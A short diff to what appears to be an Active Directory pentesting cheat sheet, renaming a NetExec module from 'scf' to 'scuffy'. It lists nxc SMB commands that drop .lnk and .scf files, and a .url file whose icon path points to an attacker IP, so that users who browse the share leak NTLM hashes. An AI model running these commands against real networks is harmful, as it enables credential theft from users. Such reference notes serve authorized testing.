@@ -51,7 +51,7 @@
   - .lnk
     - `nxc smb <dc_ip> -u '<user>' -p '<password>' -M slinky -o NAME=<filename> SERVER=<attacker_ip>`
   - .scf
-    - `nxc smb <dc_ip> -u '<user>' -p '<password>' -M scf -o NAME=<filename> SERVER=<attacker_ip>`
+    - `nxc smb <dc_ip> -u '<user>' -p '<password>' -M scuffy -o NAME=<filename> SERVER=<attacker_ip>`
   - .url
     - `[InternetShortcut]... IconFile=\\<attacker_ip>\%USERNAME%.icon`
   - Other files
